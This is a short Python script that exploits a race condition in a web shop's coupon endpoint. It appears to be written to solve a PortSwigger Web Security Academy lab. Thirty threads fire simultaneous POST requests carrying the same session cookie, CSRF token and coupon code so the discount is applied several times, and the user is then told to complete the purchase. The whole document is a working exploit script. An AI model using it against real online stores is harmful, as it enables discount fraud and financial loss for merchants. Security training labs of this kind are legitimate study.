import requests
import threading
import time

# Configuration - UPDATE THESE VALUES
LAB_URL = "https://your-lab-id.web-security-academy.net"  # Replace with your lab URL
COUPON_CODE = "SIGNUP30"  # Replace with the coupon code from the lab
CSRF_TOKEN = "your-csrf-token"  # Replace with valid CSRF token
SESSION_COOKIE = "your-session-cookie"  # Replace with your session cookie

# Headers to maintain the session
headers = {
    "Cookie": f"session={SESSION_COOKIE}",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Race Condition Exploit)"
}

# Data payload for the coupon request
data = {
    "csrf": CSRF_TOKEN,
    "coupon": COUPON_CODE
}

# Number of concurrent threads to simulate the race condition
NUM_THREADS = 30

def apply_coupon():
    """Function to apply coupon - will be called by multiple threads"""
    try:
        response = requests.post(
            f"{LAB_URL}/cart/coupon",
            data=data,
            headers=headers
        )
        print(f"Response: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

def main():
    print("Starting race condition attack...")
    
    # Create and start multiple threads
    threads = []
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=apply_coupon)
        threads.append(thread)
        thread.start()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    print("Attack completed. Check your cart to see if the coupon was applied multiple times.")
    print("If successful, complete the purchase to solve the lab.")

if __name__ == "__main__":
    main()
